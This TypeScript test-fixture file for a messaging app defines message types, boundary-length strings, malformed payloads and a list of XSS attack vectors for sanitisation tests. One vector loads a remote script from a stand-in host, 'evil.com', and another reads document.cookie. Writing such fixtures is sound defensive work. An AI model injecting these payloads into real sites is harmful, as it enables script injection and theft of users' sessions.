/**
 * Message and Payload Fixtures
 * Includes valid messages, boundary conditions, malformed formats, and XSS attack vectors.
 */

export interface TestMessage {
  id: string;
  conversationId: string;
  senderId: string;
  content: string;
  messageType: 'TEXT' | 'MEDIA' | 'SYSTEM';
  status: 'SENT' | 'DELIVERED' | 'SEEN';
  createdAt: string;
}

export const VALID_MESSAGE_TEXT = 'Acknowledged. SRE on-call is responding to incident #4092.';

export const BOUNDARY_5000_CHAR_TEXT = 'A'.repeat(5000);
export const OVERSIZED_5001_CHAR_TEXT = 'A'.repeat(5001);

export const MALFORMED_PAYLOADS = [
  { description: 'Empty object', payload: {} },
  { description: 'Missing content', payload: { conversationId: '65e9b1a10000000000000001' } },
  { description: 'Blank whitespace content', payload: { conversationId: '65e9b1a10000000000000001', content: '    ' } },
  { description: 'Empty string content', payload: { conversationId: '65e9b1a10000000000000001', content: '' } },
  { description: 'Missing conversationId', payload: { content: 'Valid message without room' } },
  { description: 'Null conversationId', payload: { conversationId: null, content: 'Valid text' } },
  { description: 'Invalid Mongo ObjectId roomId', payload: { conversationId: 'not-an-id-12345', content: 'Test' } },
];

export const XSS_ATTACK_VECTORS = [
  '<script>window.__xss_compromised = true;</script>',
  '<img src="x" onerror="window.__xss_img_onerror = true;" />',
  '<svg onload="window.__xss_svg_onload = true;" />',
  'javascript:alert(document.cookie)',
  '<a href="javascript:alert(1)">Click here to claim prize</a>',
  '"><iframe src="javascript:alert(1)"></iframe>',
  '<details open ontoggle="window.__xss_details = true;">test</details>',
  '"><script src="https://evil.com/xss.js"></script>',
  'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
];

export function createMockMessage(
  id: string,
  conversationId: string,
  senderId: string,
  content: string = VALID_MESSAGE_TEXT,
  createdAt: string = new Date().toISOString()
): TestMessage {
  return {
    id,
    conversationId,
    senderId,
    content,
    messageType: 'TEXT',
    status: 'SENT',
    createdAt,
  };
}
